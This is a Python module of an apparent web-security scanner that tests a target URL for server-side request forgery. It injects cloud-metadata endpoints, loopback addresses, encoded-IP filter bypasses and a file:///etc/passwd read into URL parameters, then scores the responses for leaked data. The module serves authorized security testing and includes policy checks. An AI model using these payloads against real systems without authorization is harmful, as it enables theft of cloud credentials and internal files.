"""Bounded browser-adapted SSRF indication testing through the shared Goar transport."""
from __future__ import annotations

import json
import re
from difflib import SequenceMatcher
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from .. import pat_data, policy
from .._http import http_request, redact_url

_TARGETS: list[dict[str, Any]] = [
    {"id": "meta-aws", "url": "http://169.254.169.254/latest/meta-data/", "tags": ["cloud", "aws"], "expect": ["ami-id", "instance-id", "meta-data"]},
    {"id": "meta-aws-imdsv2", "url": "http://169.254.169.254/latest/api/token", "tags": ["cloud", "aws"], "method": "PUT"},
    {"id": "meta-gcp", "url": "http://metadata.google.internal/computeMetadata/v1/", "tags": ["cloud", "gcp"], "headers": {"Metadata-Flavor": "Google"}, "expect": ["instance", "project"]},
    {"id": "meta-azure", "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "tags": ["cloud", "azure"], "headers": {"Metadata": "true"}, "expect": ["compute", "network"]},
    {"id": "localhost-http", "url": "http://127.0.0.1/", "tags": ["loopback"], "expect": []},
    {"id": "localhost-name", "url": "http://localhost/", "tags": ["loopback"], "expect": []},
    {"id": "localhost-ipv6", "url": "http://[::1]/", "tags": ["loopback", "ipv6"], "expect": []},
    {"id": "decimal-ip", "url": "http://2130706433/", "tags": ["bypass", "decimal"], "expect": []},
    {"id": "hex-ip", "url": "http://0x7f000001/", "tags": ["bypass", "hex"], "expect": []},
    {"id": "file-passwd", "url": "file:///etc/passwd", "tags": ["file"], "expect": ["root:"]},
]
_URL_PARAMS = ("url", "uri", "path", "src", "source", "dest", "destination", "redirect", "redirect_uri", "redirect_url", "next", "return", "continue", "data", "reference", "site", "html", "validate", "domain", "callback", "target", "link", "feed", "host", "proxy", "fetch", "img", "image", "file", "document", "page", "u", "q")
_SENSITIVE = re.compile(r"(?i)(authorization|cookie|set-cookie|x-api-key|api[_-]?key|token|secret|password)")


def _split(raw: str) -> list[str]:
    return [item.strip() for item in re.split(r"[\n,]+", str(raw or "")) if item.strip()]


def _parse_headers(raw: str | dict[str, Any] | None) -> dict[str, str]:
    if isinstance(raw, dict):
        return {str(key): str(value) for key, value in raw.items()}
    text = str(raw or "").strip()
    if text.startswith("{"):
        try:
            value = json.loads(text)
            return {str(key): str(value) for key, value in value.items()} if isinstance(value, dict) else {}
        except (TypeError, ValueError):
            return {}
    output: dict[str, str] = {}
    for line in text.splitlines():
        if ":" in line:
            key, value = line.split(":", 1)
            if key.strip():
                output[key.strip()] = value.strip()
    return output


def _redact_headers(headers: dict[str, str]) -> dict[str, str]:
    return {key: "[redacted]" if _SENSITIVE.search(key) else value for key, value in headers.items()}


def _codes(raw: str) -> set[int]:
    return {int(item.strip()) for item in str(raw or "").split(",") if item.strip().isdigit()}


def _inject(url: str, parameter: str, value: str) -> str:
    parsed = urlparse(url)
    query = dict(parse_qsl(parsed.query, keep_blank_values=True))
    query[parameter] = value
    return urlunparse(parsed._replace(query=urlencode(query, doseq=True)))


def _form(body: str, parameter: str, value: str) -> str:
    query = dict(parse_qsl(str(body or ""), keep_blank_values=True))
    query[parameter] = value
    return urlencode(query, doseq=True)


def _score(body: str, expect: list[str]) -> dict[str, list[str]]:
    lowered = (body or "").lower()
    expected = [item for item in expect if item.lower() in lowered]
    generic = [item for item in ("root:", "ami-id", "instance-id", "compute", "redis_version", "[fonts]", "metadata") if item in lowered]
    return {"expect_hits": expected, "signals": list(dict.fromkeys(expected + generic))}


def _ratio(left: str, right: str) -> float:
    return round(SequenceMatcher(None, (left or "")[:12000], (right or "")[:12000]).ratio(), 4)


async def _request(url: str, method: str, headers: dict[str, str], body: str, timeout_ms: int, retries: int, retry_codes: set[int], route: str, attempts: list[dict[str, Any]], stage: str) -> dict[str, Any]:
    use_proxy = True if route == "proxy" else False if route == "direct" else None
    response: dict[str, Any] = {}
    for number in range(max(0, min(int(retries or 0), 5)) + 1):
        response = await http_request(url, method=method, headers=headers, body=body if method not in ("GET", "HEAD", "OPTIONS") else None, timeout_ms=max(1000, min(int(timeout_ms or 8000), 120000)), use_proxy=use_proxy)
        attempts.append({"stage": stage, "attempt": number + 1, "url": redact_url(url), "method": method, "status": int(response.get("status") or 0), "ok": bool(response.get("ok")), "elapsed_ms": response.get("elapsed_ms"), "transport": response.get("transport"), "error": str(response.get("error") or "")[:240]})
        if response.get("ok") or int(response.get("status") or 0) not in retry_codes:
            break
    return response


def list_targets_pat() -> dict[str, Any]:
    rows = pat_data.get("ssrf")
    return {"payloads": rows, "count": len(rows), "source": "PayloadsAllTheThings/SSRF"}


def list_targets(tags: str = "", limit: int = 0, offset: int = 0) -> dict[str, Any]:
    wanted = {item.lower() for item in _split(tags)}
    rows = [item for item in _TARGETS if not wanted or wanted.intersection({tag.lower() for tag in item.get("tags") or []})]
    total = len(rows)
    rows = rows[max(0, int(offset or 0)):]
    if limit and int(limit) > 0:
        rows = rows[:int(limit)]
    return {"count": total, "returned": len(rows), "targets": rows, "engine": "ssrf-browser-adapted"}


async def scan(url: str, parameter: str = "", tags: str = "", max_targets: int = 12, max_payloads: int | None = None, user_agent: str = "pyodide-security/ssrf-engine/3.0", method: str = "GET", headers: str | dict[str, Any] = "", body: str = "", placement: str = "query", custom_targets: str = "", include_default: bool = True, status_codes: str = "", timeout_ms: int = 8000, retries: int = 0, retry_statuses: str = "408,429,500,502,503,504", route: str = "auto", min_difference: float = 0.08, include_response_body: bool = False, preview_chars: int = 400, include_attempts: bool = False, stop_on_finding: bool = False) -> dict[str, Any]:
    if max_payloads is not None:
        max_targets = max_payloads
    error = policy.check_url_for_active(url)
    if error:
        return {"ok": False, "error": error, "engine": "ssrf-browser-adapted", "policy": policy.status()}
    url = str(url or "").strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    method = str(method or "GET").upper()
    if method not in ("GET", "POST", "PUT", "PATCH", "HEAD", "OPTIONS"):
        method = "GET"
    placement = placement if placement in ("query", "body", "both") else "query"
    route = route if route in ("auto", "proxy", "direct") else "auto"
    query = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
    parameter = parameter or next((item for item in _URL_PARAMS if item in query), next(iter(query), "url"))
    request_headers = _parse_headers(headers)
    request_headers.setdefault("User-Agent", user_agent)
    if method in ("POST", "PUT", "PATCH") and placement in ("body", "both"):
        request_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
    wanted_tags = {item.lower() for item in _split(tags)}
    targets = [item for item in _TARGETS if not wanted_tags or wanted_tags.intersection({tag.lower() for tag in item.get("tags") or []})] if include_default else []
    targets.extend({"id": "custom-" + str(index + 1), "url": value, "tags": ["custom"], "expect": []} for index, value in enumerate(_split(custom_targets)))
    targets = list({str(item["url"]): item for item in targets}.values())[:max(1, min(int(max_targets or 12), 100))]
    retry_codes = _codes(retry_statuses) or {408, 429, 500, 502, 503, 504}
    expected = _codes(status_codes)
    attempts: list[dict[str, Any]] = []
    baseline = await _request(url, method, request_headers, str(body or ""), timeout_ms, retries, retry_codes, route, attempts, "baseline")
    baseline_text = str(baseline.get("body") or "")
    baseline_status = int(baseline.get("status") or 0)
    tests: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    stopped_reason: str | None = None
    for target in targets:
        if not policy.can_request():
            stopped_reason = "request budget exhausted"
            break
        destination = str(target["url"])
        test_url = _inject(url, parameter, destination) if placement in ("query", "both") else url
        test_body = _form(body, parameter, destination) if placement in ("body", "both") else str(body or "")
        headers_for_target = dict(request_headers)
        headers_for_target.update({str(k): str(v) for k, v in (target.get("headers") or {}).items()})
        target_method = str(target.get("method") or method).upper()
        response = await _request(test_url, target_method, headers_for_target, test_body, timeout_ms, retries, retry_codes, route, attempts, "payload")
        text = str(response.get("body") or "")
        status = int(response.get("status") or 0)
        score = _score(text, list(target.get("expect") or []))
        similarity = _ratio(baseline_text.lower(), text.lower())
        status_changed = status != baseline_status and status != 0
        meaningful = (1.0 - similarity) >= max(0.0, min(float(min_difference or 0.08), 1.0))
        accepted = not expected or status in expected
        confidence = 95 if score["expect_hits"] else 75 if score["signals"] else 50 if status_changed and meaningful else 0
        entry: dict[str, Any] = {"target_id": target["id"], "destination": destination, "tags": target.get("tags") or [], "parameter": parameter, "placement": placement, "request_url": redact_url(test_url), "status": status, "baseline_status": baseline_status, "confidence": confidence, "signals": score["signals"], "expect_hits": score["expect_hits"], "body_length": len(text), "similarity": similarity, "status_changed": status_changed, "transport": response.get("transport"), "elapsed_ms": response.get("elapsed_ms"), "error": str(response.get("error") or "")[:240]}
        if include_response_body:
            entry["body_preview"] = text[:max(0, min(int(preview_chars or 400), 5000))]
        tests.append(entry)
        if accepted and confidence >= 50:
            findings.append(entry)
            if stop_on_finding:
                stopped_reason = "finding requested stop"
                break
    findings.sort(key=lambda item: (-int(item["confidence"]), str(item["target_id"])))
    return {"ok": True, "url": redact_url(url), "parameter": parameter, "tested": len(tests), "target_count": len(targets), "findings": findings, "finding_count": len(findings), "tests": tests, "baseline": {"status": baseline_status, "length": len(baseline_text), "transport": baseline.get("transport"), "elapsed_ms": baseline.get("elapsed_ms")}, "request": {"method": method, "placement": placement, "headers": _redact_headers(request_headers), "timeout_ms": max(1000, min(int(timeout_ms or 8000), 120000)), "retries": max(0, min(int(retries or 0), 5)), "route": route, "expected_statuses": sorted(expected)}, "attempts": attempts if include_attempts else [], "attempt_count": len(attempts), "stopped_reason": stopped_reason, "engine": "ssrf-browser-adapted", "equivalent": "ssrfmap/payloads-all-the-things", "limitations": ["Browser-adapted response indication testing only; it does not confirm OOB callbacks, bypass egress controls, perform native socket protocols, or claim proof of internal-resource access without response evidence."], "policy": policy.status()}
